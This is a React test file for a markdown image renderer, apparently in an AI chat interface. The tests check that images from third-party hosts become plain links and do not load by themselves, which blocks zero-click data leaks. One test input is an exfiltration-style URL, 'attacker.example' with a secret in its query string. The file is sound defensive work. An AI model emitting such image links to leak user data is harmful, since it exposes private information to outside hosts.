import React from 'react';
import { render, screen } from '@testing-library/react';
import { img } from '../MarkdownComponents';

/**
 * The exfiltration guard at the sink: a markdown image whose src is a
 * third-party host must NOT become an auto-loading <img> (which fires a GET on
 * render — the zero-click beacon), only a link the user may choose to open.
 * Same-origin app images still render inline.
 *
 * resolveImageUrl is stubbed to identity: this test is about the origin
 * decision, not the base-path prefixing that resolveImageUrl owns.
 */
jest.mock('~/utils', () => ({
  ...jest.requireActual('~/utils'),
  resolveImageUrl: (p: string) => p,
  handleDoubleClick: () => {},
}));

const Img = img as React.ElementType;

describe('markdown image renderer — exfiltration guard', () => {
  it('renders a THIRD-PARTY image as a link, never an auto-loading img', () => {
    const { container } = render(
      <Img src="https://attacker.example/p?d=secret" alt="totally normal" />,
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link');
    expect(link).toHaveAttribute('href', 'https://attacker.example/p?d=secret');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('renders a same-origin app image inline', () => {
    const { container } = render(<Img src={`${window.location.origin}/v1/chat/images/x.png`} alt="a" />);
    expect(container.querySelector('img')).not.toBeNull();
    expect(screen.queryByRole('link')).toBeNull();
  });

  it('renders a relative app path inline (resolves to same origin)', () => {
    const { container } = render(<Img src="/v1/chat/images/y.png" alt="b" />);
    expect(container.querySelector('img')).not.toBeNull();
  });

  it('allows inline data URIs', () => {
    const { container } = render(
      <Img src="data:image/png;base64,iVBORw0KGgo=" alt="inline" />,
    );
    expect(container.querySelector('img')).not.toBeNull();
  });
});
